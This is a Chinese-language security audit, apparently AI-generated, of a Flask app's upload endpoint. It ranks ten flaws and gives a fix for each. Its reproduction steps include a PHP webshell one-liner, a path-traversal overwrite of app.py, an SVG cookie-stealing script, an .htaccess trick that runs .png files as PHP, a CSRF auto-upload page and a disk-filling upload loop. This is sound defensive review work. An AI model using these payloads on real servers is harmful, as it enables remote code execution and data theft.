# 文件上传漏洞审计报告

> **项目**：用户管理系统 (Flask)  
> **审查日期**：2026-07-21  
> **审查模块**：`/upload` 文件上传功能  
> **文件位置**：`app.py` 第 188-206 行 · `templates/upload.html` 第 8-15 行

---

## 漏洞评分标准

| 等级 | 含义 |
|------|------|
| 🔴 严重 | 可直接获取服务器权限、执行任意代码 |
| 🟠 高危 | 可造成严重破坏但需特定环境配合 |
| 🟡 中危 | 可利用但影响范围有限 |
| 🔵 低危 | 需复合其他漏洞，或仅造成信息泄露 |

---

## 漏洞清单（由高到低排列）

---

### 🔴 漏洞 1：路径遍历写入

#### 漏洞内容

`f.filename` 直接拼入保存路径，攻击者通过 `../` 路径穿越可将文件写入 `static/uploads/` 之外的任意目录，包括覆写 `app.py` 植入后门、覆写 `templates/*.html` 植入钓鱼页面。

#### 漏洞位置

`app.py` 第 200 行：

```python
save_path = os.path.join("static/uploads", f.filename)
```

#### 最简复现方式

```bash
# 覆写 app.py，植入任意代码
curl -b /tmp/cookies.txt \
  -X POST http://127.0.0.1:5000/upload \
  -F "file=@evil_app.py;filename=../../../app.py"

# 路径解析过程：
# static/uploads/../../../app.py
# → /opt/rangetest/static/uploads/../../../app.py
# → /opt/rangetest/app.py
```

#### 修复方案

```python
# 使用 os.path.basename 过滤路径
save_path = os.path.join("static/uploads", os.path.basename(f.filename))
```

```
修复前：../../../app.py  →  /opt/rangetest/app.py         ✅ 越界写入
修复后：../../../app.py  →  /opt/rangetest/static/uploads/app.py  ❌ 写入uploads内
```

---

### 🔴 漏洞 2：任意可执行文件上传（WebShell）

#### 漏洞内容

上传功能对文件扩展名不做任何检查。若服务器环境支持 PHP、JSP、ASP、CGI Python 等解析，攻击者可上传 WebShell 并通过 URL 直接访问执行，获取服务器控制权。

#### 漏洞位置

`app.py` 第 196-202 行：

```python
f = request.files.get("file")
if f and f.filename:          # ← 仅检查是否有文件名
    ...
    f.save(save_path)          # ← 直接保存，不校验后缀
```

#### 最简复现方式

```bash
# 上传 PHP WebShell（适用 Apache/Nginx + PHP）
echo '<?php system($_GET["cmd"]); ?>' > shell.php

curl -b /tmp/cookies.txt \
  -X POST http://127.0.0.1:5000/upload \
  -F "file=@shell.php"

# 直接访问执行
curl http://127.0.0.1:5000/static/uploads/shell.php?cmd=id
```

#### 修复方案

```python
ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}

def allowed_file(filename):
    return "." in filename and \
           filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS

# 在保存前检查
if not allowed_file(f.filename):
    error = "不支持的文件类型，仅允许图片文件"
```

---

### 🔴 漏洞 3：SVG 文件 XSS

#### 漏洞内容

`<svg>` 是标准图片格式，但 SVG 本质是 XML，内部可嵌入 `<script>` 标签执行任意 JavaScript。上传包含恶意脚本的 SVG 后，当其他用户访问该图片时，脚本在浏览器中执行，可窃取 Cookie、劫持 Session。

上传页面在 `upload.html` 第 11 行直接用 `<img>` 标签渲染上传的文件，SVG 中的 `<script>` 在 `<img>` 内不执行；但攻击者可直接在浏览器地址栏或新标签页中打开 SVG URL，脚本即可执行。

#### 漏洞位置

`app.py` 第 196-202 行（无后缀校验）  
`templates/upload.html` 第 11 行：

```html
<img src="{{ uploaded_url }}" style="max-width:200px; max-height:200px;">
```

#### 最简复现方式

```bash
# 创建恶意 SVG
cat > evil.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
EOF

# 上传
curl -b /tmp/cookies.txt \
  -X POST http://127.0.0.1:5000/upload \
  -F "file=@evil.svg"

# 新标签页打开
# http://127.0.0.1:5000/static/uploads/evil.svg
# → JavaScript 执行，弹出 Cookie
```

#### 修复方案

```python
# 方案一（推荐）：不将 SVG 列入白名单
ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}
# SVG 不在白名单中，直接拒绝

# 方案二（如需支持SVG）：设置 Content-Disposition: attachment 强制下载
# 在 Nginx/Apache 配置中为 .svg 文件设置
# Content-Disposition: attachment
```

---

### 🔴 漏洞 4：`.htaccess` 文件上传（Apache 配置篡改）

#### 漏洞内容

Apache 服务器会解析目录下的 `.htaccess` 文件作为配置指令。攻击者上传自定义 `.htaccess` 到 `static/uploads/`，可以：

- 将 `.png` 文件当作 PHP 执行（绕过白名单后缀）
- 禁用目录访问权限
- 设置 `Options +ExecCGI` 开启 CGI 执行
- 配置 URL 重写

#### 漏洞位置

`app.py` 第 200 行：

```python
save_path = os.path.join("static/uploads", f.filename)
# 当 f.filename = ".htaccess" 时，保存到 static/uploads/.htaccess
```

#### 最简复现方式

```bash
# 创建恶意 .htaccess：让 .png 文件按 PHP 执行
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .png
EOF

curl -b /tmp/cookies.txt \
  -X POST http://127.0.0.1:5000/upload \
  -F "file=@.htaccess"

# 再上传一个内容为 PHP 代码的 .png 文件
curl -b /tmp/cookies.txt \
  -X POST http://127.0.0.1:5000/upload \
  -F "file=@webshell.png;filename=shell.png"
# 此时 shell.png 被 Apache 当作 PHP 解析执行
```

#### 修复方案

```python
# 方案一：禁止上传以点开头的文件（隐藏文件）
if f.filename.startswith("."):
    error = "不支持上传隐藏文件"

# 方案二：白名单后缀（包含在漏洞2的修复中）
# .htaccess 不在白名单内，自然被拒绝
```

---

### 🟠 漏洞 5：文件覆盖攻击

#### 漏洞内容

使用用户提供的原始文件名保存，不添加任何唯一标识。多个用户上传同名文件时，后上传的文件会静默覆盖之前的文件。攻击者可上传恶意版本的 `avatar.png` 覆盖目标用户的真实头像。

#### 漏洞位置

`app.py` 第 200-201 行：

```python
save_path = os.path.join("static/uploads", f.filename)  # 原始文件名
f.save(save_path)                                         # 直接保存
```

#### 最简复现方式

```bash
# 用户A上传头像
curl -b /tmp/cookies_a.txt \
  -X POST http://127.0.0.1:5000/upload \
  -F "file=@real_avatar.png;filename=avatar.png"

# 攻击者上传同名文件覆盖
curl -b /tmp/cookies_attacker.txt \
  -X POST http://127.0.0.1:5000/upload \
  -F "file=@malicious.png;filename=avatar.png"

# 用户A的头像已被静默替换
```

#### 修复方案

```python
import time

# 方案：添加用户名和时间戳保证唯一性
safe_name = os.path.basename(f.filename)
name, ext = safe_name.rsplit(".", 1) if "." in safe_name else (safe_name, "")
unique_name = f"{name}_{session['username']}_{int(time.time())}.{ext}"
save_path = os.path.join("static/uploads", unique_name)
```

---

### 🟠 漏洞 6：Content-Type MIME 类型篡改

#### 漏洞内容

上传逻辑完全不读取也不验证文件的 `Content-Type` 请求头。攻击者可发送一个 PHP 文件，但声明 `Content-Type: image/png`，绕过依赖 MIME 校验的安全策略（虽然本项目也未实现）。

#### 漏洞位置

`app.py` 第 196-202 行（未读取 `f.content_type`）：

```python
f = request.files.get("file")
if f and f.filename:       # ← 不检查 content_type
```

#### 最简复现方式

```bash
# 上传 PHP 文件，伪装 MIME 为 image/png
curl -b /tmp/cookies.txt \
  -X POST http://127.0.0.1:5000/upload \
  -F "file=@shell.php;filename=shell.php;type=image/png"

# 虽然设置了 type=image/png，文件仍被保存为 shell.php
```

#### 修复方案

```python
# 方案：仅依赖后缀白名单（足够），
# 如需额外安全，添加文件头魔数验证
import imghdr  # Python 标准库

f.seek(0)
file_type = imghdr.what(f)
f.seek(0)

if file_type not in {"png", "jpeg", "gif", "webp", "bmp"}:
    error = "非图片文件"
```

---

### 🟠 漏洞 7：无扩展名文件上传

#### 漏洞内容

文件名为 `test`（无点号，无扩展名）时，不触发任何异常，文件被直接保存。这类文件可能被服务器当作未知类型处理，在某些配置下触发 CGI 或作为脚本执行。

#### 漏洞位置

`app.py` 第 200-201 行：

```python
save_path = os.path.join("static/uploads", f.filename)
# filename = "test"  → 保存为 static/uploads/test
```

#### 最简复现方式

```bash
curl -b /tmp/cookies.txt \
  -X POST http://127.0.0.1:5000/upload \
  -F "file=@payload;filename=test"
```

#### 修复方案

```python
# 白名单后缀检查会自然拦截无扩展名文件
if "." not in f.filename:
    error = "文件缺少扩展名"
```

---

### 🟠 漏洞 8：双扩展名文件上传

#### 漏洞内容

文件名为 `test.php.jpg` 时，不同服务器解析方式不同：
- Apache 默认从右向左识别扩展名 → 视为 `.jpg`，相对安全
- Nginx + PHP-FPM 某些配置下从右向左碰到可识别的 PHP 扩展名 → 可能解析为 PHP  
- Windows IIS 某些版本也容易受双扩展名绕过

#### 漏洞位置

`app.py` 第 200-201 行（无扩展校验）：

```python
save_path = os.path.join("static/uploads", f.filename)
# filename = "test.php.jpg"  → 保存为 static/uploads/test.php.jpg
```

#### 最简复现方式

```bash
echo '<?php system($_GET["cmd"]); ?>' > test.php.jpg

curl -b /tmp/cookies.txt \
  -X POST http://127.0.0.1:5000/upload \
  -F "file=@test.php.jpg"

# 取决于服务器配置，test.php.jpg 可能被解析为 PHP
```

#### 修复方案

```python
# 方案一：仅信任最后一个扩展名（白名单自然覆盖）
ext = filename.rsplit(".", 1)[1].lower()
# 无论前面有多少个扩展名，只看最后一个

# 方案二：不允许扩展名中出现多个点（较激进）
if filename.count(".") > 1:
    error = "文件名不合法"
```

---

### 🟡 漏洞 9：上传大小限制不完整

#### 漏洞内容

`MAX_CONTENT_LENGTH = 16MB` 限制的是整个 HTTP 请求体大小。攻击者可通过分块传输或并发上传多个大文件绕过限制，逐步填满磁盘空间造成 DoS。每文件保存前无独立大小校验。

#### 漏洞位置

`app.py` 第 13 行 + 第 200-201 行：

```python
app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1022  # HTTP层限制
# ...
f.save(save_path)  # ← 保存前不检查文件实际大小
```

#### 最简复现方式

```bash
# 并发上传多个接近16MB的文件填满磁盘
for i in $(seq 1 50); do
  dd if=/dev/zero bs=15M count=1 | \
    curl -b /tmp/cookies.txt -X POST http://127.0.0.1:5000/upload \
    -F "file=@-;filename=big_$i.bin" &
done
```

#### 修复方案

```python
import os

MAX_PER_FILE = 5 * 1024 * 1024  # 5MB

# 保存前检查
f.seek(0, os.SEEK_END)
size = f.tell()
f.seek(0)

if size > MAX_PER_FILE:
    error = f"文件过大，允许最大 {MAX_PER_FILE // 1024 // 1024}MB"
```

---

### 🟡 漏洞 10：CSRF 防护缺失

#### 漏洞内容

上传表单没有 CSRF Token。攻击者构造恶意页面的表单自动提交到 `/upload` 接口，已登录用户只要访问该页面就会自动上传攻击者指定的文件。

#### 漏洞位置

`templates/upload.html` 第 17 行：

```html
<form method="post" action="/upload" enctype="multipart/form-data">
```

表单中无 CSRF Token 隐藏字段。

#### 最简复现方式

```html
<!-- 攻击者页面中隐藏的表单 -->
<form action="http://127.0.0.1:5000/upload" method="POST" enctype="multipart/form-data" id="csrf_form">
    <input type="file" name="file" id="csrf_file">
</form>
<script>
    // 构造恶意文件自动上传
    var blob = new Blob(['<?php system($_GET["cmd"]);?>'], {type: 'image/png'});
    var file = new File([blob], 'shell.php');
    var dt = new DataTransfer();
    dt.items.add(file);
    document.getElementById('csrf_file').files = dt.files;
    document.getElementById('csrf_form').submit();
</script>
```

#### 修复方案

```python
import secrets

# GET 请求时生成 Token
session["upload_csrf"] = secrets.token_hex(16)

# POST 时验证
if request.form.get("csrf_token") != session.get("upload_csrf"):
    error = "CSRF 验证失败"
```

模板中添加：
```html
<input type="hidden" name="csrf_token" value="{{ session.get('upload_csrf', '') }}">
```

---

## 风险总览

| # | 漏洞 | 等级 | 最简 Payload | 漏洞根因 |
|---|------|------|--------------|----------|
| 1 | 路径遍历写入 | 🔴 严重 | `filename=../../../app.py` | 未过滤 `../` |
| 2 | WebShell 上传 | 🔴 严重 | `filename=shell.php` | 无后缀校验 |
| 3 | SVG XSS | 🔴 严重 | `evil.svg` 含 `<script>` | 无后缀校验 |
| 4 | .htaccess 配置篡改 | 🔴 严重 | `filename=.htaccess` | 无隐藏文件拦截 |
| 5 | 文件覆盖 | 🟠 高危 | 同名文件重传 | 无唯一化处理 |
| 6 | MIME 篡改 | 🟠 高危 | `type=image/png` 伪装 | 未校验 content_type |
| 7 | 无扩展名文件 | 🟠 高危 | `filename=test` | 未校验必有后缀 |
| 8 | 双扩展名绕过 | 🟠 高危 | `filename=test.php.jpg` | 多后缀不做处理 |
| 9 | 大小限制不完整 | 🟡 中危 | 并发大文件 | 保存前无独立校验 |
| 10 | CSRF 防护缺失 | 🟡 中危 | 跨站自动提交表单 | 无 Token 校验 |

---

## 修复优先级建议

```
第一优先（立即修复）：
  #1 路径遍历    ← 最危险，5行代码修复
  #2 WebShell    ← 直接 RCE
  #3 SVG XSS     ← 用户数据泄露
  #4 .htaccess   ← 配置篡改

第二优先（尽快修复）：
  #5 文件覆盖
  #6 MIME校验
  #7 无后缀
  #8 双扩展名

第三优先（可选增强）：
  #9 大小校验
  #10 CSRF
```

> 四个 🔴 严重漏洞的修复仅需一次白名单后缀校验即可覆盖 #2 #3 #4 #7 #8，再加一行 `os.path.basename()` 覆盖 #1。

---

*报告生成时间：2026-07-21 · 使用 Claude Code*
